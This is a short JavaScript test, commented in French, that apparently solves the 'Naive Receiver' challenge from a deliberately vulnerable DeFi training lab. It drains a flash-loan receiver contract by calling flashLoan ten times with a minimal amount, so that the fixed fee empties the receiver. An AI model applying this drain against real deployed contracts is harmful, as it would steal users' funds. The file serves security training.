/**
 * Exploit pour la vulnérabilité Naive Receiver
 * 
 * Cette exploitation profite de l'absence de restriction sur qui peut 
 * initier un prêt flash pour un receveur donné, et des frais fixes élevés.
 */

it('Exploit', async function () {
    console.log('Solde initial du receveur:', (await ethers.provider.getBalance(this.receiver.address)).toString());
    
    // Vider le contrat receveur en effectuant 10 appels de prêt flash avec un montant minimal
    for (let i = 0; i < 10; i++) {
        await this.pool.flashLoan(this.receiver.address, '1');
        console.log(`Après appel ${i+1}, solde du receveur:`, 
            (await ethers.provider.getBalance(this.receiver.address)).toString());
    }
    
    console.log('Solde final du receveur:', (await ethers.provider.getBalance(this.receiver.address)).toString());
});